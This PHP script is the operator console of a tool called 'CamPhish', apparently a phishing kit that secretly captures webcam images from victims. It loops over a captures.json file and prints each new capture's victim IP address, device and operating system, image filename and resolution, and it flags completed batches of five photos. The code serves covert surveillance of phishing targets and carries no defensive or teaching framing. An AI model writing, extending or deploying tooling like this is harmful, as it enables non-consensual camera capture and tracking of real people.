<?php
// Capture notification script for terminal operator
// This script monitors captures.json and sends notifications to terminal

echo "=== CamPhish Capture Monitor ===\n";
echo "Monitoring for new captures...\n";
echo "Press Ctrl+C to stop monitoring\n\n";

$last_capture_count = 0;
$capture_file = 'captures.json';

while (true) {
    if (file_exists($capture_file)) {
        $captures = json_decode(file_get_contents($capture_file), true);
        $current_count = is_array($captures) ? count($captures) : 0;
        
        if ($current_count > $last_capture_count) {
            $new_captures = array_slice($captures, $last_capture_count);
            
            foreach ($new_captures as $capture) {
                echo "\n📸 NEW CAPTURE DETECTED!\n";
                echo "═══════════════════════════════════════════════════════════════\n";
                echo "🕐 Time: " . ($capture['timestamp'] ?? 'Unknown') . "\n";
                echo "🌐 IP: " . ($capture['ip_address'] ?? 'Unknown') . "\n";
                echo "📱 Device: " . ($capture['device']['device_name'] ?? 'Unknown') . " (" . ($capture['device']['os'] ?? 'Unknown') . ")\n";
                echo "📁 File: " . ($capture['filename'] ?? 'Unknown') . "\n";
                echo "📏 Size: " . ($capture['size_kb'] ?? 'Unknown') . " KB\n";
                echo "🖼️ Resolution: " . ($capture['resolution'] ?? 'Unknown') . "\n";
                echo "📊 Status: " . ($capture['status'] ?? 'Unknown') . "\n";
                echo "═══════════════════════════════════════════════════════════════\n";
                
                // Check if this completes a batch of 5
                if ($current_count % 5 == 0) {
                    echo "✅ BATCH OF 5 CAPTURES COMPLETED!\n";
                    echo "🔄 Next batch will start automatically in 3 seconds...\n";
                }
            }
            
            $last_capture_count = $current_count;
        }
    }
    
    // Check every second for new captures
    sleep(1);
}
?>
